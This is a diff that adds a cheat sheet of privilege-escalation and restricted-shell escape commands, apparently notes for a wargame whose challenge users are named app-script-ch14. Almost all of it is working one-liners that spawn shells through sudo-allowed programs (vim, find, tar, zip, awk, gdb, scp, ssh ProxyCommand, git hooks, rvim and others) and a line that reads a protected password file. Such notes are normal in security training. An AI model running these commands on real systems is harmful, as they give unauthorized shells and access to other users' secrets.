@@ -1,0 +1,95 @@
+### escalate ###
+## link
+https://gtfobins.github.io/
+
+## escape rshell
+echo $0
+export SHELL=/bin/bash
+export PATH=/bin:/usr/bin:/sbin
+echo test > test_file
+/bin/ls
+/bin/bash
+exec /bin/bash
+pico /etc/passwd
+pico -s /bin/bash
+sudo -l
+
+"! ls" "shell ls" "!shell"
+Program to test : telnet, mail, ftp, less, more, vi, vim, gdb, lynx
+
+## vim ##
+vim --cmd "set shell=/bin/bash" --cmd "shell"
+export PATH=/bin:/usr/bin:/sbin
+export SHELL=/bin/bash
+
+## find ##
+cd /tmp && touch test && find test -exec "whoami" \;
+find test -exec "/bin/sh" \;
+
+## python ##
+sudo -u app-script-ch14-2 /usr/bin/python -c 'import os;os.system("/bin/bash")'
+
+## tar ##
+sudo -u app-script-ch14-3 /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+## zip ##
+cd /tmp && echo "test" > azerty123
+sudo -u app-script-ch14-4 /usr/bin/zip ox90.zip azerty123 -T --unzip-command="sh -c /bin/bash"
+
+## awk ##
+sudo -u app-script-ch14-5 /usr/bin/awk 'BEGIN {system("/bin/bash")}'
+
+## gdb ##
+sudo -u app-script-ch14-6 /usr/bin/gdb -nx -ex '!/bin/bash' -ex quit
+sudo -u app-script-ch14-6 /usr/bin/gdb
+!/bin/bash
+
+## pico ##
+sudo -u app-script-ch14-7 /usr/bin/pico -s "/bin/bash"
+/bin/bash
+^T
+
+## scp ##
+TF=$(mktemp)
+echo '/bin/bash 0<&2 1>&2' > $TF
+chmod 777 "$TF"
+sudo -u app-script-ch14-8 scp -S $TF x y:
+
+echo "/bin/bash 0<&2 1>&2" > /tmp/zaza.sh
+chmod 777 /tmp/zaza.sh
+sudo -u app-script-ch14-8 scp -S /tmp/zaza.sh x:y ./
+
+## env ##
+sudo -u app-script-ch14-9 env /bin/bash
+
+## ssh ##
+sudo -u app-script-ch14-10 /usr/bin/ssh localhost $SHELL --noprofile --norc
+sudo -u app-script-ch14-10 /usr/bin/ssh -o ProxyCommand=';/bin/bash 0<&2 1>&2' 127.0.0.1
+
+## git ##
+sudo -u app-script-ch14-11 /usr/bin/git help config
+!/bin/bash
+
+TF=$(mktemp -d)
+git init "$TF"
+echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
+mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
+chmod -R 777 "$TF"
+sudo -u app-script-ch14-11 /usr/bin/git -C "$TF" commit --allow-empty -m x
+
+
+## rvim ##
+sudo -u app-script-ch14-12 /usr/bin/rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+sudo -u app-script-ch14-12 /usr/bin/rvim -c ':lua os.execute("reset; exec sh")'
+sudo -u app-script-ch14-12 /usr/bin/rvim -c ':python import os; os.system("/bin/bash")'
+
+sudo -u app-script-ch14-12 /usr/bin/rvim --cmd ":python3 import os; os.system('/bin/bash')"
+
+## script ##
+sudo -u app-script-ch14-13 /usr/bin/script -q /dev/null
+
+## rbash ##
+sudo -u app-script-ch14-14 /usr/bin/rbash --
+mapfile TEST < ../.passwd TEST
+echo $TEST
+
